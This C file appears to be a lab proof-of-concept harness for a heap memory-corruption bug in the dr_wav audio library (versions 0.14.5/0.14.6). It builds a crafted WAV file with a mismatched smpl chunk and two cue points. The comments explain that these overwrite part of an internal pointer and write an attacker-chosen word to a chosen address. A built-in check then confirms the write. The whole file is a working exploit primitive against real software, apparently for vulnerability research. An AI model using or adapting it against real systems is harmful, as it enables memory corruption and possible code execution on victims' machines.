/*
 * drwav2shell lab harness. Real dr_wav 0.14.5 / 0.14.6 single-header library,
 * called through the public drwav_init_memory_with_metadata() API.
 *
 * File layout: fmt + data + mismatched smpl + cue(2 points). The smpl
 * mismatch desynchronizes pass 1 from pass 2; cue point 0 rewrites the low
 * half of pCuePoints in the unaccounted metadata slot, cue point 1 stores a
 * file-chosen word at destination+24. Same model as Talos TALOS-2026-2442.
 */
#define DR_WAV_IMPLEMENTATION
#include "dr_wav.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void put16(unsigned char* p, unsigned int v) { p[0] = (unsigned char)v; p[1] = (unsigned char)(v >> 8); }
static void put32(unsigned char* p, unsigned int v) {
    p[0] = (unsigned char)v; p[1] = (unsigned char)(v >> 8);
    p[2] = (unsigned char)(v >> 16); p[3] = (unsigned char)(v >> 24);
}
static unsigned int get32(const unsigned char* p) {
    return (unsigned int)p[0] | ((unsigned int)p[1] << 8) |
           ((unsigned int)p[2] << 16) | ((unsigned int)p[3] << 24);
}

/* Chunk helper: returns body offset. */
static size_t chunk(unsigned char* p, size_t off, const char id[4], unsigned int size) {
    memcpy(p + off, id, 4);
    put32(p + off + 4, size);
    return off + 8;
}

static size_t build_wav(unsigned char* p, int mismatch, unsigned int ptr_low, unsigned int value) {
    size_t off = 0, body;
    memcpy(p, "RIFF", 4);
    put32(p + 4, 142); /* 4 (WAVE) + 24 fmt + 10 data + 44 smpl + 60 cue */
    memcpy(p + 8, "WAVE", 4);
    off = 12;

    body = chunk(p, off, "fmt ", 16);
    put16(p + body, 1); put16(p + body + 2, 1);
    put32(p + body + 4, 44100); put32(p + body + 8, 88200);
    put16(p + body + 12, 2); put16(p + body + 14, 16);
    off = body + 16;

    body = chunk(p, off, "data", 2);
    p[body] = 0; p[body + 1] = 0;
    off = body + 2;

    /* smpl: 36 bytes; loopCount at +28. */
    body = chunk(p, off, "smpl", 36);
    memset(p + body, 0, 36);
    put32(p + body + 28, mismatch ? 1 : 0);
    off = body + 36;

    /* cue: 4-byte count plus two 24-byte cue points. */
    body = chunk(p, off, "cue ", 52);
    put32(p + body, 2);
    /* point 0 fields land over the unaccounted slot's cue.pCuePoints pointer
       (union at +8, pointer at +16). The sampleOffset store at +20 is made
       through the pointer already modified by the blockStart store. */
    put32(p + body + 4 + 0, 0x4d495348);   /* "MISH" id */
    put32(p + body + 4 + 4, 0x45455348);   /* "HSEE" playOrderPosition */
    memcpy(p + body + 4 + 8, "data", 4);
    put32(p + body + 4 + 12, 0);
    put32(p + body + 4 + 16, ptr_low);     /* overwrites pointer low 32 bits */
    put32(p + body + 4 + 20, 0);
    /* point 1: id written through the pointer above, at destination+24. */
    put32(p + body + 28 + 0, value);
    put32(p + body + 28 + 4, 0x42424242);
    memcpy(p + body + 28 + 8, "data", 4);
    put32(p + body + 28 + 12, 0);
    put32(p + body + 28 + 16, 0);
    put32(p + body + 28 + 20, 0);
    off = body + 52;
    return off; /* 150 */
}

int main(int argc, char** argv) {
    const char* mode = argc > 1 ? argv[1] : "chosen";
    unsigned char wav[256];
    drwav w;
    unsigned int ptr_low;
    unsigned int value = 0x4841434b; /* "HACK" */
    unsigned char* target = NULL;
    size_t target_size = 0, n, i;
    int found = 0;
    int mismatch = strcmp(mode, "safe") != 0;

    if (strcmp(mode, "chosen") == 0) {
        target = (unsigned char*)malloc(176); /* same ASan size class as metadata block */
        target_size = 176;
        ptr_low = (unsigned int)(unsigned long)target;
    } else if (strcmp(mode, "heap") == 0) {
        target = (unsigned char*)malloc(32);
        target_size = 32;
        ptr_low = (unsigned int)(unsigned long)target;
    } else if (strcmp(mode, "bad") == 0) {
        ptr_low = 0x41414141;
    } else if (strcmp(mode, "safe") == 0) {
        target = (unsigned char*)malloc(176);
        target_size = 176;
        ptr_low = (unsigned int)(unsigned long)target;
    } else {
        fprintf(stderr, "unknown mode %s\n", mode);
        return 2;
    }
    printf("target_ptr=%p\n", (void*)target);

    n = build_wav(wav, mismatch, ptr_low, value);
    printf("mode=%s wav_bytes=%zu ptr_low=0x%08x value=0x%08x\n", mode, n, ptr_low, value);
    printf("DRWAV_VERSION_STRING=%s\n", drwav_version_string());
    if (target != NULL) memset(target, 0x5a, target_size);
    if (target != NULL) {
        printf("target_before=");
        for (i = 16; i < target_size && i < 40; ++i) printf("%02x", target[i]);
        printf("\n");
    }
    fflush(stdout);

    memset(&w, 0, sizeof(w));
    if (!drwav_init_memory_with_metadata(&w, wav, n, 0, NULL)) {
        printf("INIT_FAILED\n");
        return 1;
    }
    printf("init=OK metadataCount=%u\n", w.metadataCount);
    if (target != NULL) {
        printf("target_after=");
        for (i = 16; i < target_size && i < 40; ++i) printf("%02x", target[i]);
        printf("\n");
        for (i = 24; i + 4 <= target_size; ++i) {
            if (get32(target + i) == value) found = 1;
        }
        printf("CHOSEN_WORD_PRESENT=%d\n", found);
    }
    fflush(stdout);
    drwav_uninit(&w);
    if (target != NULL) free(target);
    return 0;
}
